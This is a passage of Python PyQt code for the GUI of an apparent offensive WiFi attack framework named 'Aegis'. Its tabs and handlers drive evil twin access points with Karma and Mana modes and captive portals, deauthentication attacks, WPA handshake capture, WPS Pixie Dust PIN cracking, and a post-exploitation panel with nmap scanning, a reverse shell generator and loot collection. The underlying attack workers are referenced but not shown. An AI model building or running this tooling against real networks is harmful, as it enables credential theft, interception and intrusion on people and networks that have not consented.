        self.append_output(f"ERROR: {text}", COLORS['error'])

    def append_success(self, text: str):
        self.append_output(text, COLORS['success'])

    def append_warning(self, text: str):
        self.append_output(text, COLORS['warning'])

    def append_info(self, text: str):
        self.append_output(text, COLORS['primary'])

    def append_cyan(self, text: str):
        self.append_output(text, COLORS['cyan'])

    def append_yellow(self, text: str):
        self.append_output(text, COLORS['yellow'])

    def append_magenta(self, text: str):
        self.append_output(text, COLORS['magenta'])


# ============================================================================
# MAIN GUI WINDOW
# ============================================================================

class AegisGUI(QMainWindow):
    """Main Aegis WiFi Framework GUI"""

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION}")
        self.setGeometry(100, 100, 1500, 950)

        # Module manager
        self.module_manager = ModuleManager()

        # State
        self.selected_interface = None
        self.selected_network: Optional[WiFiNetwork] = None
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}
        self.loot: List[CapturedLoot] = []

        # Workers
        self.scanner_thread: Optional[NetworkScanner] = None
        self.evil_twin_worker: Optional[EvilTwinWorker] = None
        self.wps_worker: Optional[WPSAttack] = None
        self.handshake_worker: Optional[HandshakeCapture] = None
        self.deauth_worker: Optional[DeauthAttack] = None
        self.nmap_scanner: Optional[NmapScanner] = None

        # UI Setup
        self._setup_styles()
        self._init_ui()
        self._setup_menu()

    def _setup_styles(self):
        """Setup dark theme"""
        stylesheet = f"""
        QMainWindow {{
            background-color: {COLORS['background']};
            color: {COLORS['text']};
        }}
        QWidget {{
            background-color: {COLORS['background']};
            color: {COLORS['text']};
        }}
        QTabWidget::pane {{
            border: 1px solid {COLORS['border']};
            background-color: {COLORS['surface']};
        }}
        QTabBar::tab {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text']};
            padding: 10px 20px;
            margin: 2px;
            border-radius: 4px;
        }}
        QTabBar::tab:selected {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
            font-weight: bold;
        }}
        QPushButton {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
        }}
        QPushButton:hover {{
            background-color: {COLORS['accent']};
        }}
        QPushButton:disabled {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text_dim']};
        }}
        QPushButton[stopButton="true"] {{
            background-color: {COLORS['danger']};
        }}
        QTableWidget {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            gridline-color: {COLORS['border']};
            border: 1px solid {COLORS['border']};
        }}
        QTableWidget::item:selected {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
        }}
        QHeaderView::section {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text']};
            padding: 5px;
            border: 1px solid {COLORS['border']};
            font-weight: bold;
        }}
        QTextEdit, QTextBrowser {{
            background-color: {COLORS['terminal_bg']};
            color: {COLORS['terminal_text']};
            border: 1px solid {COLORS['border']};
            font-family: 'Courier New', monospace;
        }}
        QLineEdit {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
            padding: 8px;
            border-radius: 3px;
        }}
        QCheckBox {{
            color: {COLORS['text']};
        }}
        QLabel {{
            color: {COLORS['text']};
        }}
        QGroupBox {{
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
            border-radius: 4px;
            margin-top: 10px;
            padding-top: 10px;
        }}
        QStatusBar {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border-top: 1px solid {COLORS['border']};
        }}
        QMenuBar {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
        }}
        QMenu {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
        }}
        QListWidget {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
        }}
        """
        self.setStyleSheet(stylesheet)

    def _init_ui(self):
        """Initialize main UI"""
        central = QWidget()
        self.setCentralWidget(central)

        layout = QHBoxLayout(central)

        # Main splitter
        splitter = QSplitter(Qt.Horizontal)

        # Left panel
        left_panel = self._create_left_panel()
        splitter.addWidget(left_panel)

        # Right - Tab widget
        self.tabs = QTabWidget()

        # Recon Tab
        if self.module_manager.is_enabled('wifi_recon'):
            recon_tab = self._create_recon_tab()
            self.tabs.addTab(recon_tab, "📡 Recon")

        # Evil Twin Tab
        if self.module_manager.is_enabled('evil_twin'):
            evil_tab = self._create_evil_twin_tab()
            self.tabs.addTab(evil_tab, "👿 Evil Twin")

        # Handshake Tab
        if self.module_manager.is_enabled('handshake'):
            handshake_tab = self._create_handshake_tab()
            self.tabs.addTab(handshake_tab, "🔐 Handshake")

        # WPS Tab
        if self.module_manager.is_enabled('wps'):
            wps_tab = self._create_wps_tab()
            self.tabs.addTab(wps_tab, "🔑 WPS")

        # Post-Exploitation Tab
        if self.module_manager.is_enabled('post_exploit'):
            post_tab = self._create_post_exploit_tab()
            self.tabs.addTab(post_tab, "💀 Post-Exploit")

        # Manual Builder Tab
        if self.module_manager.is_enabled('manual_builder'):
            manual_tab = self._create_manual_tab()
            self.tabs.addTab(manual_tab, "🔧 Manual")

        splitter.addWidget(self.tabs)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)

        layout.addWidget(splitter)

        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")

    def _create_left_panel(self) -> QWidget:
        """Create left panel with interface list"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Title
        title = QLabel("🔌 Interfaces")
        title.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(title)

        # Interface list
        self.interface_list = QListWidget()
        self.interface_list.itemSelectionChanged.connect(self._on_interface_selected)
        layout.addWidget(self.interface_list)

        # Buttons
        btn_layout = QHBoxLayout()

        refresh_btn = QPushButton("🔄")
        refresh_btn.clicked.connect(self._refresh_interfaces)
        btn_layout.addWidget(refresh_btn)

        self.monitor_btn = QPushButton("📡 Monitor")
        self.monitor_btn.clicked.connect(self._enable_monitor)
        btn_layout.addWidget(self.monitor_btn)

        self.managed_btn = QPushButton("📶 Managed")
        self.managed_btn.clicked.connect(self._disable_monitor)
        btn_layout.addWidget(self.managed_btn)

        layout.addLayout(btn_layout)

        # Interface info
        self.iface_info = QTextEdit()
        self.iface_info.setReadOnly(True)
        self.iface_info.setMaximumHeight(120)
        layout.addWidget(self.iface_info)

        # Network count
        self.network_count = QLabel("Networks: 0")
        layout.addWidget(self.network_count)

        # Quick network list
        self.network_list = QListWidget()
        self.network_list.setMaximumHeight(150)
        self.network_list.itemSelectionChanged.connect(self._on_network_selected_from_list)
        layout.addWidget(self.network_list)

        # Initial refresh
        self._refresh_interfaces()

        return widget

    def _create_recon_tab(self) -> QWidget:
        """Create reconnaissance tab with rich output"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Controls
        control_layout = QHBoxLayout()

        self.scan_btn = QPushButton("▶ Start Scan")
        self.scan_btn.clicked.connect(self._start_scanner)
        control_layout.addWidget(self.scan_btn)

        self.stop_scan_btn = QPushButton("⏹ Stop")
        self.stop_scan_btn.setEnabled(False)
        self.stop_scan_btn.clicked.connect(self._stop_scanner)
        control_layout.addWidget(self.stop_scan_btn)

        control_layout.addStretch()

        layout.addLayout(control_layout)

        # Network table - comprehensive columns
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(14)
        self.network_table.setHorizontalHeaderLabels([
            "MAC (BSSID)", "SSID", "CH", "Signal", "Security", "Encryption",
            "Auth", "Manufacturer", "WPS", "Clients", "Beacons", "M1", "M2", "M3/M4"
        ])
        self.network_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.network_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.network_table.itemSelectionChanged.connect(self._on_network_table_selected)
        layout.addWidget(self.network_table)

        # Terminal output for detailed scan info
        self.recon_terminal = TerminalWidget()
        self.recon_terminal.setMaximumHeight(200)
        layout.addWidget(self.recon_terminal)

        # Status
        status_layout = QHBoxLayout()
        self.scan_status_label = QLabel("Status: Idle")
        status_layout.addWidget(self.scan_status_label)
        status_layout.addStretch()
        layout.addLayout(status_layout)

        return widget

    def _create_evil_twin_tab(self) -> QWidget:
        """Create Evil Twin tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Configuration
        config_group = QGroupBox("Configuration")
        config_layout = QFormLayout(config_group)

        self.evil_ssid = QLineEdit()
        self.evil_ssid.setText("FreeWiFi")
        config_layout.addRow("SSID:", self.evil_ssid)

        self.evil_channel = QSpinBox()
        self.evil_channel.setRange(1, 13)
        self.evil_channel.setValue(6)
        config_layout.addRow("Channel:", self.evil_channel)

        self.evil_password = QLineEdit()
        self.evil_password.setEchoMode(QLineEdit.Password)
        config_layout.addRow("Password:", self.evil_password)

        layout.addWidget(config_group)

        # Options
        options_group = QGroupBox("Attack Options")
        options_layout = QVBoxLayout(options_group)

        self.karma_checkbox = QCheckBox("Karma Mode (respond to all probe requests)")
        options_layout.addWidget(self.karma_checkbox)

        self.mana_checkbox = QCheckBox("Mana Mode (evil twin all networks)")
        options_layout.addWidget(self.mana_checkbox)

        self.open_wifi_checkbox = QCheckBox("Open Network (no password)")
        self.open_wifi_checkbox.setChecked(True)
        self.open_wifi_checkbox.toggled.connect(self._on_open_wifi_toggled)
        options_layout.addWidget(self.open_wifi_checkbox)

        self.captive_checkbox = QCheckBox("Enable Captive Portal")
        options_layout.addWidget(self.captive_checkbox)

        layout.addWidget(options_group)

        # Controls
        btn_layout = QHBoxLayout()

        self.evil_start_btn = QPushButton("▶ Start Evil Twin")
        self.evil_start_btn.clicked.connect(self._start_evil_twin)
        btn_layout.addWidget(self.evil_start_btn)

        self.evil_stop_btn = QPushButton("⏹ Stop")
        self.evil_stop_btn.setEnabled(False)
        self.evil_stop_btn.setProperty("stopButton", True)
        self.evil_stop_btn.clicked.connect(self._stop_evil_twin)
        btn_layout.addWidget(self.evil_stop_btn)

        layout.addLayout(btn_layout)

        # Terminal
        self.evil_terminal = TerminalWidget()
        layout.addWidget(self.evil_terminal)

        return widget

    def _create_handshake_tab(self) -> QWidget:
        """Create handshake capture tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target info
        target_group = QGroupBox("Target Network")
        target_layout = QFormLayout(target_group)

        self.handshake_bssid = QLineEdit()
        self.handshake_bssid.setReadOnly(True)
        target_layout.addRow("BSSID:", self.handshake_bssid)

        self.handshake_ssid = QLineEdit()
        self.handshake_ssid.setReadOnly(True)
        target_layout.addRow("SSID:", self.handshake_ssid)

        self.handshake_channel = QLineEdit()
        self.handshake_channel.setReadOnly(True)
        target_layout.addRow("Channel:", self.handshake_channel)

        layout.addWidget(target_group)

        # Deauth controls
        deauth_layout = QHBoxLayout()

        self.deauth_btn = QPushButton("▶ Send Deauth")
        self.deauth_btn.clicked.connect(self._send_deauth)
        deauth_layout.addWidget(self.deauth_btn)

        self.deauth_client = QLineEdit()
        self.deauth_client.setPlaceholderText("Client MAC (optional)")
        deauth_layout.addWidget(self.deauth_client)

        deauth_layout.addStretch()

        layout.addLayout(deauth_layout)

        # Handshake capture
        capture_layout = QHBoxLayout()

        self.handshake_btn = QPushButton("▶ Start Capture")
        self.handshake_btn.clicked.connect(self._start_handshake_capture)
        capture_layout.addWidget(self.handshake_btn)

        self.handshake_stop_btn = QPushButton("⏹ Stop")
        self.handshake_stop_btn.setEnabled(False)
        self.handshake_stop_btn.setProperty("stopButton", True)
        self.handshake_stop_btn.clicked.connect(self._stop_handshake_capture)
        capture_layout.addWidget(self.handshake_stop_btn)

        capture_layout.addStretch()

        layout.addLayout(capture_layout)

        # Handshake status
        self.handshake_status = QLabel("Handshake: Not captured")
        layout.addWidget(self.handshake_status)

        # Terminal
        self.handshake_terminal = TerminalWidget()
        layout.addWidget(self.handshake_terminal)

        return widget

    def _create_wps_tab(self) -> QWidget:
        """Create WPS attack tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target
        target_group = QGroupBox("Target")
        target_layout = QFormLayout(target_group)

        self.wps_bssid = QLineEdit()
        self.wps_bssid.setReadOnly(True)
        target_layout.addRow("BSSID:", self.wps_bssid)

        self.wps_channel = QLineEdit()
        self.wps_channel.setReadOnly(True)
        target_layout.addRow("Channel:", self.wps_channel)

        layout.addWidget(target_group)

        # Options
        options_group = QGroupBox("Attack Options")
        options_layout = QVBoxLayout(options_group)

        self.pixie_checkbox = QCheckBox("Pixie Dust Attack")
        self.pixie_checkbox.setChecked(True)
        options_layout.addWidget(self.pixie_checkbox)

        layout.addWidget(options_group)

        # Controls
        btn_layout = QHBoxLayout()

        self.wps_start_btn = QPushButton("▶ Start WPS Attack")
        self.wps_start_btn.clicked.connect(self._start_wps_attack)
        btn_layout.addWidget(self.wps_start_btn)

        self.wps_stop_btn = QPushButton("⏹ Stop")
        self.wps_stop_btn.setEnabled(False)
        self.wps_stop_btn.setProperty("stopButton", True)
        self.wps_stop_btn.clicked.connect(self._stop_wps_attack)
        btn_layout.addWidget(self.wps_stop_btn)

        layout.addLayout(btn_layout)

        # Progress
        self.wps_progress = QProgressBar()
        layout.addWidget(self.wps_progress)

        # Terminal
        self.wps_terminal = TerminalWidget()
        layout.addWidget(self.wps_terminal)

        return widget

    def _create_post_exploit_tab(self) -> QWidget:
        """Create post-exploitation tab with context awareness"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Context status
        context_group = QGroupBox("Network Context")
        context_layout = QFormLayout(context_group)

        self.context_status = QLabel("Checking...")
        context_layout.addRow("Status:", self.context_status)

        self.local_ip = QLabel("Unknown")
        context_layout.addRow("Local IP:", self.local_ip)

        self.gateway_ip = QLabel("Unknown")
        context_layout.addRow("Gateway:", self.gateway_ip)

        layout.addWidget(context_group)

        # Check context button
        check_btn = QPushButton("🔄 Check Network Context")
        check_btn.clicked.connect(self._check_network_context)
        layout.addWidget(check_btn)

        # Nmap scan
        nmap_group = QGroupBox("Nmap Scanner")
        nmap_layout = QFormLayout(nmap_group)

        self.nmap_target = QLineEdit()
        self.nmap_target.setPlaceholderText("Target IP or range (e.g., 192.168.1.0/24)")
        nmap_layout.addRow("Target:", self.nmap_target)

        self.nmap_type = QComboBox()
        self.nmap_type.addItems(["Quick Scan", "Stealth Scan", "Full Scan", "Vuln Scan", "Quick Ports"])
        nmap_layout.addRow("Scan Type:", self.nmap_type)

        nmap_btn_layout = QHBoxLayout()

        self.nmap_start_btn = QPushButton("▶ Run Nmap")
        self.nmap_start_btn.clicked.connect(self._run_nmap)
        nmap_btn_layout.addWidget(self.nmap_start_btn)

        self.nmap_stop_btn = QPushButton("⏹ Stop")
        self.nmap_stop_btn.setEnabled(False)
        self.nmap_stop_btn.clicked.connect(self._stop_nmap)
        nmap_btn_layout.addWidget(self.nmap_stop_btn)

        nmap_layout.addRow("", nmap_btn_layout)

        layout.addWidget(nmap_group)

        # Results table
        self.nmap_results = QTableWidget()
        self.nmap_results.setColumnCount(6)
        self.nmap_results.setHorizontalHeaderLabels(["IP", "Hostname", "MAC", "Vendor", "Ports", "Services"])
        layout.addWidget(self.nmap_results)

        # Reverse Shell Generator
        shell_group = QGroupBox("Reverse Shell Generator")
        shell_layout = QFormLayout(shell_group)

        self.shell_lhost = QLineEdit()
        self.shell_lhost.setPlaceholderText("Your IP")
        shell_layout.addRow("LHOST:", self.shell_lhost)

        self.shell_lport = QSpinBox()
        self.shell_lport.setRange(1, 65535)
        self.shell_lport.setValue(4444)
        shell_layout.addRow("LPORT:", self.shell_lport)

        generate_btn = QPushButton("🔐 Generate Shells")
        generate_btn.clicked.connect(self._generate_shells)
        shell_layout.addRow("", generate_btn)

        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setMaximumHeight(150)
        shell_layout.addRow("Generated Shells:", self.shell_output)

        layout.addWidget(shell_group)

        # Loot Collector
        loot_group = QGroupBox("Loot Collection")
        loot_layout = QVBoxLayout(loot_group)

        loot_btn_layout = QHBoxLayout()

        loot_btn = QPushButton("📥 Collect Loot")
        loot_btn.clicked.connect(self._collect_loot)
        loot_btn_layout.addWidget(loot_btn)

        clear_loot_btn = QPushButton("🗑 Clear Loot")
        clear_loot_btn.clicked.connect(self._clear_loot)
        loot_btn_layout.addWidget(clear_loot_btn)

        loot_layout.addLayout(loot_btn_layout)

        self.loot_display = QTextEdit()
        self.loot_display.setReadOnly(True)
        self.loot_display.setMaximumHeight(150)
        loot_layout.addWidget(self.loot_display)

        layout.addWidget(loot_group)

        # Terminal
        self.post_terminal = TerminalWidget()
        layout.addWidget(self.post_terminal)

        # Initial context check
        self._check_network_context()

        return widget

    def _create_manual_tab(self) -> QWidget:
        """Create manual builder tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Hostapd config
        hostapd_group = QGroupBox("hostapd.conf Builder")
        hostapd_layout = QFormLayout(hostapd_group)

        self.manual_ssid = QLineEdit()
        self.manual_ssid.setText("MyAP")
        hostapd_layout.addRow("SSID:", self.manual_ssid)

        self.manual_channel = QSpinBox()
        self.manual_channel.setRange(1, 13)
        self.manual_channel.setValue(6)
        hostapd_layout.addRow("Channel:", self.manual_channel)

        self.manual_security = QComboBox()
        self.manual_security.addItems(["Open", "WPA2", "WPA3"])
        hostapd_layout.addRow("Security:", self.manual_security)

        self.manual_password = QLineEdit()
        self.manual_password.setEchoMode(QLineEdit.Password)
        hostapd_layout.addRow("Password:", self.manual_password)

        # Preview
        generate_btn = QPushButton("🔄 Generate Config")
        generate_btn.clicked.connect(self._generate_config)
        hostapd_layout.addRow("", generate_btn)

        self.config_preview = QTextEdit()
        self.config_preview.setReadOnly(True)
        self.config_preview.setMaximumHeight(200)
        hostapd_layout.addRow("Config:", self.config_preview)

        layout.addWidget(hostapd_group)

        # Terminal
        self.manual_terminal = TerminalWidget()
        layout.addWidget(self.manual_terminal)

        return widget

    def _setup_menu(self):
        """Setup menu bar"""
        menubar = self.menuBar()

        # Modules menu
        modules_menu = menubar.addMenu("📦 Modules")

        for module_name in self.module_manager.modules.keys():
            action = QAction(module_name.replace('_', ' ').title(), self)
            action.setCheckable(True)
            action.setChecked(self.module_manager.is_enabled(module_name))
            action.triggered.connect(lambda checked, mn=module_name: self._toggle_module(mn))
            modules_menu.addAction(action)

        # Tools menu
        tools_menu = menubar.addMenu("🔧 Tools")
        tools_menu.addAction("Check Dependencies", self._check_dependencies)

        # Help menu
        help_menu = menubar.addMenu("❓ Help")
        help_menu.addAction("About", self._show_about)

    def _toggle_module(self, module_name: str):
        """Toggle module on/off"""
        enabled = self.module_manager.toggle(module_name)
        self.status_bar.showMessage(f"Module {module_name}: {'enabled' if enabled else 'disabled'}")

    # =========================================================================
    # INTERFACE MANAGEMENT
    # =========================================================================

    def _refresh_interfaces(self):
        """Refresh interface list"""
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            interfaces = []

            for line in result.stdout.split('\n'):
                if ':' in line and not line.startswith(' '):
                    parts = line.split(':')
                    name = parts[1].strip()
                    if name and 'wlan' in name or 'wlo' in name:
                        interfaces.append(name)

            self.interface_list.clear()
            for iface in interfaces:
                item = QListWidgetItem(f"📶 {iface}")
                self.interface_list.addItem(item)

        except Exception as e:
            logger.error(f"Error refreshing interfaces: {e}")

    def _on_interface_selected(self):
        item = self.interface_list.currentItem()
        if item:
            self.selected_interface = item.text().split()[1]
            self.iface_info.setText(f"Selected: {self.selected_interface}")
            self.status_bar.showMessage(f"Interface: {self.selected_interface}")

    def _enable_monitor(self):
        if not self.selected_interface:
            return

        cmd = ["sudo", "airmon-ng", "start", self.selected_interface]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            self.status_bar.showMessage(f"Monitor mode enabled on {self.selected_interface}")
            self.iface_info.append("Monitor mode: ENABLED")
        else:
            self.status_bar.showMessage(f"Error: {result.stderr}")

    def _disable_monitor(self):
        if not self.selected_interface:
            return

        cmd = ["sudo", "airmon-ng", "stop", self.selected_interface]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            self.status_bar.showMessage(f"Monitor mode disabled")
            self.iface_info.append("Monitor mode: DISABLED")
        else:
            self.status_bar.showMessage(f"Error: {result.stderr}")

    # =========================================================================
    # SCANNING
    # =========================================================================

    def _start_scanner(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        self.scanner_thread = NetworkScanner(self.selected_interface)
        self.scanner_thread.network_found.connect(self._on_network_found)
        self.scanner_thread.networks_updated.connect(self._on_networks_updated)
        self.scanner_thread.scan_status.connect(self._on_scan_status)
        self.scanner_thread.start()

        self.scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)
        self.recon_terminal.append_output("Scanner started")

    def _stop_scanner(self):
        if self.scanner_thread:
            self.scanner_thread.stop()
            self.scanner_thread.wait(timeout=2000)

        self.scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.recon_terminal.append_output("Scanner stopped")

    def _on_network_found(self, network: WiFiNetwork):
        self.networks[network.bssid] = network
        self._update_network_table()
        self._update_network_list()

        # Rich terminal output
        self.recon_terminal.append_cyan(f"[+] Found: {network.ssid} ({network.bssid})")
        self.recon_terminal.append_info(f"    Channel: {network.channel} | Signal: {network.signal} dBm | Security: {network.security}")

    def _on_networks_updated(self, networks: List[WiFiNetwork]):
        self.network_count.setText(f"Networks: {len(networks)}")

    def _on_scan_status(self, status: str):
        self.scan_status_label.setText(f"Status: {status}")

    def _update_network_table(self):
        self.network_table.setRowCount(0)

        for network in sorted(self.networks.values(), key=lambda x: x.signal, reverse=True):
            row = self.network_table.rowCount()
            self.network_table.insertRow(row)

            self.network_table.setItem(row, 0, QTableWidgetItem(network.bssid))
            self.network_table.setItem(row, 1, QTableWidgetItem(network.ssid))
            self.network_table.setItem(row, 2, QTableWidgetItem(str(network.channel)))

            signal_item = QTableWidgetItem(f"{network.signal} dBm")
            if network.signal > -50:
                signal_item.setForeground(QBrush(QColor(COLORS['success'])))
            elif network.signal > -70:
                signal_item.setForeground(QBrush(QColor(COLORS['warning'])))
            else:
                signal_item.setForeground(QBrush(QColor(COLORS['danger'])))
            self.network_table.setItem(row, 3, signal_item)

            self.network_table.setItem(row, 4, QTableWidgetItem(network.security))
            self.network_table.setItem(row, 5, QTableWidgetItem(network.encryption))
            self.network_table.setItem(row, 6, QTableWidgetItem(network.auth))
            self.network_table.setItem(row, 7, QTableWidgetItem(network.manufacturer))
            self.network_table.setItem(row, 8, QTableWidgetItem(network.wps))
            self.network_table.setItem(row, 9, QTableWidgetItem(str(network.clients)))
            self.network_table.setItem(row, 10, QTableWidgetItem(str(network.beacon)))

            # Handshake status
            m1 = "✓" if network.handshake_m1 else "-"
            m2 = "✓" if network.handshake_m2 else "-"
            m3m4 = "✓" if (network.handshake_m3 and network.handshake_m4) else "-"
            self.network_table.setItem(row, 11, QTableWidgetItem(m1))
            self.network_table.setItem(row, 12, QTableWidgetItem(m2))
            self.network_table.setItem(row, 13, QTableWidgetItem(m3m4))

    def _update_network_list(self):
        self.network_list.clear()
        for network in sorted(self.networks.values(), key=lambda x: x.signal, reverse=True)[:15]:
            signal_icon = "📶" if network.signal > -60 else "📵"
            item = QListWidgetItem(f"{signal_icon} {network.ssid} ({network.signal}dBm)")
            item.setData(Qt.UserRole, network)
            self.network_list.addItem(item)

    def _on_network_selected_from_list(self):
        item = self.network_list.currentItem()
        if item:
            self.selected_network = item.data(Qt.UserRole)
            self._update_target_fields()

    def _on_network_table_selected(self):
        rows = self.network_table.selectedItems()
        if rows:
            row = rows[0].row()
            bssid = self.network_table.item(row, 0).text()
            self.selected_network = self.networks.get(bssid)
            self._update_target_fields()

    def _update_target_fields(self):
        if not self.selected_network:
            return

        # Update all tabs
        self.handshake_bssid.setText(self.selected_network.bssid)
        self.handshake_ssid.setText(self.selected_network.ssid)
        self.handshake_channel.setText(str(self.selected_network.channel))

        self.wps_bssid.setText(self.selected_network.bssid)
        self.wps_channel.setText(str(self.selected_network.channel))

        self.evil_ssid.setText(self.selected_network.ssid)
        self.evil_channel.setValue(self.selected_network.channel)

        self.recon_terminal.append_success(f"Selected target: {self.selected_network.ssid}")

    # =========================================================================
    # EVIL TWIN
    # =========================================================================

    def _on_open_wifi_toggled(self, checked: bool):
        self.evil_password.setEnabled(not checked)

    def _start_evil_twin(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        ssid = self.evil_ssid.text().strip()
        if not ssid:
            QMessageBox.warning(self, "Error", "Enter SSID")
            return

        karma = self.karma_checkbox.isChecked()
        mana = self.mana_checkbox.isChecked()
        open_wifi = self.open_wifi_checkbox.isChecked()
        password = self.evil_password.text() if not open_wifi else ""

        self.evil_twin_worker = EvilTwinWorker(
            ssid=ssid,
            interface=self.selected_interface,
            bssid=self.selected_network.bssid if self.selected_network else "",
            channel=self.evil_channel.value(),
            karma_mode=karma,
            mana_mode=mana,
            open_network=open_wifi,
            password=password
        )

        self.evil_twin_worker.status_changed.connect(self._on_evil_twin_status)
        self.evil_twin_worker.start()

        self.evil_start_btn.setEnabled(False)
        self.evil_stop_btn.setEnabled(True)

    def _stop_evil_twin(self):
        if self.evil_twin_worker:
            self.evil_twin_worker.stop()
            self.evil_twin_worker.wait(timeout=3000)

        self.evil_start_btn.setEnabled(True)
        self.evil_stop_btn.setEnabled(False)
        self.evil_terminal.append_output("Evil Twin stopped")

    def _on_evil_twin_status(self, status: str):
        self.evil_terminal.append_output(status)

    # =========================================================================
    # HANDSHAKE
    # =========================================================================

    def _send_deauth(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        client_mac = self.deauth_client.text().strip() or "FF:FF:FF:FF:FF:FF"

        self.deauth_worker = DeauthAttack(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            client_mac=client_mac,
            channel=self.selected_network.channel
        )

        self.deauth_worker.status_changed.connect(self._on_deauth_status)
        self.deauth_worker.packets_sent.connect(lambda x: self.handshake_terminal.append_output(f"Deauth sent: {x}"))
        self.deauth_worker.start()

    def _on_deauth_status(self, status: str):
        self.handshake_terminal.append_output(status)

    def _start_handshake_capture(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        self.handshake_worker = HandshakeCapture(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            ssid=self.selected_network.ssid,
            channel=self.selected_network.channel
        )

        self.handshake_worker.status_changed.connect(self._on_handshake_status)
        self.handshake_worker.handshake_captured.connect(self._on_handshake_captured)
        self.handshake_worker.start()

        self.handshake_btn.setEnabled(False)
        self.handshake_stop_btn.setEnabled(True)

    def _stop_handshake_capture(self):
        if self.handshake_worker:
            self.handshake_worker.stop()
            self.handshake_worker.wait(timeout=2000)

        self.handshake_btn.setEnabled(True)
        self.handshake_stop_btn.setEnabled(False)

    def _on_handshake_status(self, status: str):
        self.handshake_terminal.append_output(status)

    def _on_handshake_captured(self, filepath: str, data: dict):
        self.handshake_status.setText(f"Handshake: Captured (M1:{data['m1']} M2:{data['m2']} M3:{data['m3']} M4:{data['m4']})")
        self.handshake_terminal.append_success(f"Handshake saved to: {filepath}")

        if self.selected_network:
            self.selected_network.handshake_m1 = data['m1']
            self.selected_network.handshake_m2 = data['m2']
            self.selected_network.handshake_m3 = data['m3']
            self.selected_network.handshake_m4 = data['m4']
            self._update_network_table()

    # =========================================================================
    # WPS
    # =========================================================================

    def _start_wps_attack(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        self.wps_worker = WPSAttack(
            interface=self.selected_interface,
            bssid=self.selected_network.bssid,
            channel=self.selected_network.channel,
            pixie=self.pixie_checkbox.isChecked()
        )

        self.wps_worker.status_changed.connect(self._on_wps_status)
        self.wps_worker.wps_success.connect(self._on_wps_success)
        self.wps_worker.start()

        self.wps_start_btn.setEnabled(False)
        self.wps_stop_btn.setEnabled(True)

    def _stop_wps_attack(self):
        if self.wps_worker:
            self.wps_worker.stop()
            self.wps_worker.wait(timeout=2000)

        self.wps_start_btn.setEnabled(True)
        self.wps_stop_btn.setEnabled(False)

    def _on_wps_status(self, status: str):
        self.wps_terminal.append_output(status)

    def _on_wps_success(self, pin: str, password: str):
        self.wps_terminal.append_success(f"WPS PIN: {pin}")
        if password:
            self.wps_terminal.append_success(f"WPA Password: {password}")
        QMessageBox.information(self, "WPS Success", f"PIN: {pin}\nPassword: {password}")

    # =========================================================================
    # POST-EXPLOITATION
    # =========================================================================

    def _check_network_context(self):
        """Check network context for post-exploitation"""
        local_info = NetworkContextChecker.get_local_info()

        ready, message = NetworkContextChecker.check_post_exploit_ready()

        self.context_status.setText(message)
        self.local_ip.setText(local_info['ip'])
        self.gateway_ip.setText(local_info['gateway'])

        if ready:
            self.context_status.setStyleSheet(f"color: {COLORS['success']}")
            self.post_terminal.append_success(message)
        else:
            self.context_status.setStyleSheet(f"color: {COLORS['danger']}")
            self.post_terminal.append_error(message)
            self.post_terminal.append_warning("Post-exploitation features require being on the same network!")

    def _run_nmap(self):
        """Run nmap scan"""
        target = self.nmap_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Enter target IP or range")
            return

        scan_type_map = {
            "Quick Scan": "quick",
            "Stealth Scan": "stealth",
            "Full Scan": "full",
            "Vuln Scan": "vuln",
            "Quick Ports": "quick_ports"
        }

        scan_type = scan_type_map.get(self.nmap_type.currentText(), "quick")

        # Check network context first
        ready, message = NetworkContextChecker.check_post_exploit_ready(target)
        if not ready:
            QMessageBox.warning(self, "Network Context", message)

        self.nmap_scanner = NmapScanner(target, scan_type)
